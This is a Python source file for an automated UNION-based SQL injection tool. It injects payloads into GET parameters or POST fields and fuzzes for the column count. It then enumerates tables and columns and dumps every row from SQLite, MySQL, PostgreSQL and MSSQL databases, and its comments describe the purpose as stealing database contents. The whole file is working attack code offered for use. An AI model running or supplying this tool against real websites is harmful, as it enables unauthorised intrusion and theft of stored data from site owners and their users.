import re
import requests
from urllib.parse import urlparse, parse_qsl, urlencode

# ansi colors
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
ORANGE = "\033[38;5;208m"
RESET = "\033[0m"

# attack marker
DELIMITER = "VACC1N3"

def log_result(output_file, data):
    # save output -> write to file
    if output_file:
        with open(output_file, "a") as f:
            f.write(data + "\n")

def execute_injection(url, method, payload, post_data=None, user_agent=None):
    # send attack -> execute HTTP GET/POST with payload
    headers = {"User-Agent": user_agent} if user_agent else {}
    try:
        if method.upper() == "GET":
            # inject GET -> put payload in URL parameters
            parsed_url = urlparse(url)
            params = dict(parse_qsl(parsed_url.query))
            for key in params:
                params[key] = payload
            vuln_url = parsed_url._replace(query=urlencode(params)).geturl()
            return requests.get(vuln_url, headers=headers).text

        elif method.upper() == "POST":
            # inject POST -> put payload in first form field
            if not post_data:
                return None
            attack_data = post_data.copy()
            first_key = list(attack_data.keys())[0]
            attack_data[first_key] += payload
            return requests.post(url, data=attack_data, headers=headers).text

    except requests.exceptions.RequestException as e:
        print(f"{RED}[ERROR] Connection failed:{RESET} {e}")
    return None

def find_column_count_and_prefix(url, method, post_data, user_agent):
    # fuzzing -> guess number of columns needed for UNION
    print(f"{YELLOW}[INFO] Discovering required UNION columns and syntax...{RESET}")
    prefixes = ["-1 UNION SELECT ", "-1' UNION SELECT "]
    
    for prefix in prefixes:
        for i in range(1, 15):
            # test columns -> send 'SUCCESS' marker
            cols = [f"'{DELIMITER}SUCCESS{DELIMITER}'"] * i
            payload = f"{prefix}{', '.join(cols)}-- "
            response = execute_injection(url, method, payload, post_data, user_agent)

            # verify success -> check if marker reflects without SQL errors
            if response and f"{DELIMITER}SUCCESS{DELIMITER}" in response and "SQL Error" not in response and "OperationalError" not in response:
                print(f"{GREEN}    -> Success: {i} columns with prefix '{prefix.strip()}'{RESET}")
                return i, prefix
    
    print(f"{ORANGE}[WARNING] Could not determine column count. Defaulting to 1.{RESET}")
    return 1, "-1' UNION SELECT "

def extract_sqlite_data(url, output_file, method, post_data=None, user_agent=None):
    # extract SQLite -> steal DB contents
    print(f"{CYAN}\n[INFO] Initiating dynamic UNION-based SQL extraction for SQLite...{RESET}")
    num_cols, prefix = find_column_count_and_prefix(url, method, post_data, user_agent)

    def build_payload(target_data, from_clause=""):
        # ealance UNION -> match original query columns
        cols = [target_data] * num_cols
        query = f"{prefix}{', '.join(cols)}"
        if from_clause: query += f" {from_clause}"
        query += "--"
        return query

    # 1. get Tables -> sqlite_master
    print(f"\n{YELLOW}[INFO] Extracting table names...{RESET}")
    tables_data = f"'{DELIMITER}' || GROUP_CONCAT(tbl_name, '::::') || '{DELIMITER}'"
    tables_from = "FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'"
    tables_payload = build_payload(tables_data, tables_from)
    response_text = execute_injection(url, method, tables_payload, post_data, user_agent)
    
    if not response_text: return
    matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", response_text)
    
    # anti-reflection -> ignore our own payload string
    clean_matches = [m for m in matches if m not in tables_payload]
    if not clean_matches: return
    tables = clean_matches[0].split("::::")
    
    for table in set(tables):
        if not table: continue
        print(f"{GREEN}    -> Found table:{RESET} {table}")
        log_result(output_file, f"\n[TABLE: {table}]")

        # 2. get Columns -> parse CREATE TABLE
        schema_data = f"'{DELIMITER}' || sql || '{DELIMITER}'"
        schema_from = f"FROM sqlite_master WHERE type='table' AND tbl_name='{table}'"
        schema_payload = build_payload(schema_data, schema_from)
        schema_response = execute_injection(url, method, schema_payload, post_data, user_agent)
        
        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", schema_response)
        clean_schemas = [m for m in matches if m not in schema_payload]
        if not clean_schemas: continue

        columns_match = re.search(r"\((.*)\)", clean_schemas[0])
        if not columns_match: continue
        columns = [col.strip().split(" ")[0] for col in columns_match.group(1).split(",")]
        print(f"{CYAN}    -> Columns:{RESET} {', '.join(columns)}")

        # 3. get Data -> dump rows
        print(f"{YELLOW}[INFO] Dumping data from{RESET} {table}...")
        cols_concat = " || ' : ' || ".join(columns)
        dump_data = f"'{DELIMITER}' || GROUP_CONCAT({cols_concat}, '::::') || '{DELIMITER}'"
        dump_from = f"FROM {table}"
        dump_payload = build_payload(dump_data, dump_from)
        dump_response = execute_injection(url, method, dump_payload, post_data, user_agent)

        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", dump_response)
        clean_dumps = [m for m in matches if m not in dump_payload]
        if clean_dumps:
            for record in set(clean_dumps[0].split("::::")):
                if record:
                    print(f"       {record}")
                    log_result(output_file, f"{record}")
        else:
            print(f"{ORANGE}       (Table is empty or extraction failed){RESET}")

def extract_mysql_data(url, output_file, method, post_data=None, user_agent=None):
    # extract MySQL -> steal DB contents
    print(f"{CYAN}\n[INFO] Initiating dynamic UNION-based SQL extraction for MySQL...{RESET}")
    num_cols, prefix = find_column_count_and_prefix(url, method, post_data, user_agent)

    def build_payload(target_data, from_clause=""):
        # ealance UNION -> match original query columns
        cols = [target_data] * num_cols
        query = f"{prefix}{', '.join(cols)}"
        if from_clause: query += f" {from_clause}"
        query += "-- " 
        return query

    # 1. get Tables -> information_schema
    print(f"\n{YELLOW}[INFO] Extracting table names...{RESET}")
    tables_data = f"CONCAT('{DELIMITER}', GROUP_CONCAT(table_name SEPARATOR '::::'), '{DELIMITER}')"
    tables_from = "FROM information_schema.tables WHERE table_schema=database()"
    tables_payload = build_payload(tables_data, tables_from)
    response_text = execute_injection(url, method, tables_payload, post_data, user_agent)

    if not response_text: return
    matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", response_text)
    
    # anti-reflection -> ignore our own payload string
    clean_matches = [m for m in matches if m not in tables_payload]
    if not clean_matches: return
    tables = clean_matches[0].split("::::")
    
    for table in set(tables):
        if not table: continue
        print(f"{GREEN}    -> Found table:{RESET} {table}")
        log_result(output_file, f"\n[TABLE: {table}]")

        # 2. get Columns -> information_schema
        columns_data = f"CONCAT('{DELIMITER}', GROUP_CONCAT(column_name SEPARATOR '::::'), '{DELIMITER}')"
        columns_from = f"FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database()"
        columns_payload = build_payload(columns_data, columns_from)
        columns_response = execute_injection(url, method, columns_payload, post_data, user_agent)
        
        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", columns_response)
        clean_schemas = [m for m in matches if m not in columns_payload]
        if not clean_schemas: continue
        columns = clean_schemas[0].split("::::")
        print(f"{CYAN}    -> Columns:{RESET} {', '.join(columns)}")

        # 3. get Data -> dump rows
        print(f"{YELLOW}[INFO] Dumping data from{RESET} {table}...")
        cols_concat = "CONCAT(" + ", ' : ', ".join(columns) + ")"
        dump_data = f"CONCAT('{DELIMITER}', GROUP_CONCAT({cols_concat} SEPARATOR '::::'), '{DELIMITER}')"
        dump_from = f"FROM {table}"
        dump_payload = build_payload(dump_data, dump_from)
        dump_response = execute_injection(url, method, dump_payload, post_data, user_agent)

        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", dump_response)
        clean_dumps = [m for m in matches if m not in dump_payload]
        if clean_dumps:
            for record in set(clean_dumps[0].split("::::")):
                if record:
                    print(f"       {record}")
                    log_result(output_file, f"{record}")
        else:
            print(f"{ORANGE}       (Table is empty or extraction failed){RESET}")

def extract_postgresql_data(url, output_file, method, post_data=None, user_agent=None):
    # extract PostgreSQL -> steal DB contents
    print(f"{CYAN}\n[INFO] Initiating dynamic UNION-based SQL extraction for PostgreSQL...{RESET}")
    num_cols, prefix = find_column_count_and_prefix(url, method, post_data, user_agent)

    def build_payload(target_data, from_clause=""):
        # balance UNION -> match original query columns
        cols = [target_data] * num_cols
        query = f"{prefix}{', '.join(cols)}"
        if from_clause: query += f" {from_clause}"
        query += "--"
        return query

    # 1. get Tables -> information_schema
    print(f"\n{YELLOW}[INFO] Extracting table names...{RESET}")
    tables_data = f"'{DELIMITER}' || STRING_AGG(table_name, '::::') || '{DELIMITER}'"
    tables_from = "FROM information_schema.tables WHERE table_schema='public'"
    tables_payload = build_payload(tables_data, tables_from)
    response_text = execute_injection(url, method, tables_payload, post_data, user_agent)

    if not response_text: return
    matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", response_text)
    
    # anti-reflection -> ignore our own payload string
    clean_matches = [m for m in matches if m not in tables_payload]
    if not clean_matches: return
    tables = clean_matches[0].split("::::")
    
    for table in set(tables):
        if not table: continue
        print(f"{GREEN}    -> Found table:{RESET} {table}")
        log_result(output_file, f"\n[TABLE: {table}]")

        # 2. get Columns -> information_schema
        columns_data = f"'{DELIMITER}' || STRING_AGG(column_name, '::::') || '{DELIMITER}'"
        columns_from = f"FROM information_schema.columns WHERE table_name='{table}'"
        columns_payload = build_payload(columns_data, columns_from)
        columns_response = execute_injection(url, method, columns_payload, post_data, user_agent)
        
        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", columns_response)
        clean_schemas = [m for m in matches if m not in columns_payload]
        if not clean_schemas: continue
        columns = clean_schemas[0].split("::::")
        print(f"{CYAN}    -> Columns:{RESET} {', '.join(columns)}")

        # 3. get Data -> dump rows
        print(f"{YELLOW}[INFO] Dumping data from{RESET} {table}...")
        cols_concat = " || ' : ' || ".join(columns)
        dump_data = f"'{DELIMITER}' || STRING_AGG({cols_concat}, '::::') || '{DELIMITER}'"
        dump_from = f"FROM {table}"
        dump_payload = build_payload(dump_data, dump_from)
        dump_response = execute_injection(url, method, dump_payload, post_data, user_agent)

        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", dump_response)
        clean_dumps = [m for m in matches if m not in dump_payload]
        if clean_dumps:
            for record in set(clean_dumps[0].split("::::")):
                if record:
                    print(f"       {record}")
                    log_result(output_file, f"{record}")
        else:
            print(f"{ORANGE}       (Table is empty or extraction failed){RESET}")

def extract_mssql_data(url, output_file, method, post_data=None, user_agent=None):
    # extract MSSQL -> steal DB contents
    print(f"{CYAN}\n[INFO] Initiating dynamic UNION-based SQL extraction for MSSQL...{RESET}")
    num_cols, prefix = find_column_count_and_prefix(url, method, post_data, user_agent)

    def build_payload(target_data, from_clause=""):
        # Balance UNION -> match original query columns
        cols = [target_data] * num_cols
        query = f"{prefix}{', '.join(cols)}"
        if from_clause: query += f" {from_clause}"
        query += "--"
        return query

    # 1. get Tables -> information_schema
    print(f"\n{YELLOW}[INFO] Extracting table names...{RESET}")
    tables_data = f"'{DELIMITER}' + STRING_AGG(table_name, '::::') + '{DELIMITER}'"
    tables_from = "FROM information_schema.tables"
    tables_payload = build_payload(tables_data, tables_from)
    response_text = execute_injection(url, method, tables_payload, post_data, user_agent)

    if not response_text: return
    matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", response_text)

    # anti-reflection -> ignore our own payload string
    clean_matches = [m for m in matches if m not in tables_payload]
    if not clean_matches: return
    tables = clean_matches[0].split("::::")

    for table in set(tables):
        if not table: continue
        print(f"{GREEN}    -> Found table:{RESET} {table}")
        log_result(output_file, f"\n[TABLE: {table}]")

        # 2. get Columns -> information_schema
        columns_data = f"'{DELIMITER}' + STRING_AGG(column_name, '::::') + '{DELIMITER}'"
        columns_from = f"FROM information_schema.columns WHERE table_name='{table}'"
        columns_payload = build_payload(columns_data, columns_from)
        columns_response = execute_injection(url, method, columns_payload, post_data, user_agent)

        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", columns_response)
        clean_schemas = [m for m in matches if m not in columns_payload]
        if not clean_schemas: continue
        columns = clean_schemas[0].split("::::")
        print(f"{CYAN}    -> Columns:{RESET} {', '.join(columns)}")

        # 3. get Data -> dump rows
        print(f"{YELLOW}[INFO] Dumping data from{RESET} {table}...")
        cols_concat = " + ' : ' + ".join(columns)
        dump_data = f"'{DELIMITER}' + STRING_AGG({cols_concat}, '::::') + '{DELIMITER}'"
        dump_from = f"FROM {table}"
        dump_payload = build_payload(dump_data, dump_from)
        dump_response = execute_injection(url, method, dump_payload, post_data, user_agent)

        matches = re.findall(rf"{DELIMITER}(.*?){DELIMITER}", dump_response)
        clean_dumps = [m for m in matches if m not in dump_payload]
        if clean_dumps:
            for record in set(clean_dumps[0].split("::::")):
                if record:
                    print(f"       {record}")
                    log_result(output_file, f"{record}")
        else:
            print(f"{ORANGE}       (Table is empty or extraction failed){RESET}")
